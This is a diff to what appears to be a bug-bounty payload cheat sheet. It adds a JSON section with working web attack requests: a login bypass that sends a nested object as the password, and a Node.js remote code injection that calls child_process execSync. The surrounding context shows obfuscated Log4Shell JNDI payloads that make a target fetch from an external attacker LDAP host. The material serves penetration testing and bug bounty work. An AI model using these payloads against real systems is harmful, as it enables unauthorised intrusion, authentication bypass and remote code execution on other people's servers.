@@ -18,6 +18,7 @@
 
 ### BugBounty
   - [Payloads](#payloads)
+  - [JSON](#json)
   - [One liner bugbounty](#one-liner-bugbounty)
   - [CMS exploitation](#cms-exploitation)
      - [Wordpress](#wordpress)
@@ -125,6 +126,27 @@ ${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
 ```
 
+
+# JSON
+
+##### `bypass admin login on sql misconfig`
+```http
+POST /api/login HTTP/1.1
+Host: vuln-web.io
+[...]
+
+{"username":"admin","password":{"password": 1}}
+```
+
+##### `node.js calculate() rce with json body`
+```http
+POST /api/activity HTTP/1.1
+Host: vuln-web.io
+[...]
+
+{"activity":"sleep'+(global.process.mainModule.require('child_process').execSync('sleep 10'))+'","health":"63","weight":"42","happiness":"56"}
+
+```
 
 # One liner BugBounty
 
